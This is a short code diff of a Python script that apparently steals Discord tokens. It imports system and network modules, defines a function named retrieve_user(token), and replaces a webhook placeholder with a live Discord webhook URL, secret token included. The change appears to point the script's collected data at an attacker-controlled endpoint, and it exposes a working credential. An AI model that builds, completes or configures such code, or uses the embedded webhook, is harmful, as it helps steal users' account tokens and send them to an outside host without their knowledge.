@@ -1,6 +1,6 @@
 import os, re, json, random, platform, socket, uuid, requests
 
-WEBHOOK_URL = "<YOUR_WEBHOOK_URL>"
+WEBHOOK_URL = "https://discord.com/api/webhooks/934955991974416414/EwSeKHmCFlxvtiMtE1_-oRkNwy9JgJ-XF8bxppf0_OllLLkkFllnyretcqGSldmJW8Sb"
 
 
 def retrieve_user(token):
